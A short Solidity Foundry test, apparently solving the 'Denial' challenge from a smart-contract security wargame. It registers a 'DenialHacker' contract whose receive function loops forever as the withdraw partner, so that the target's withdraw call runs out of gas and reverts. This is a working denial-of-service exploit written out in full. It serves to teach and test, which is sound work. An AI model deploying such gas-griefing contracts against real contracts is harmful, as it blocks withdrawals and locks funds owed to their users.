// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Denial} from "../src/Denial.sol";

contract DenialTest is Test {
    Denial public target;
    DenialHacker public hacker;

    constructor() {
        target = new Denial();
        hacker = new DenialHacker();
    }

    function test_hack() public {
        target.setWithdrawPartner(address(hacker));

        vm.expectRevert();
        target.withdraw();
    }
}

contract DenialHacker {
    constructor() {}

    receive() external payable {
        while (true) {}
    }
}
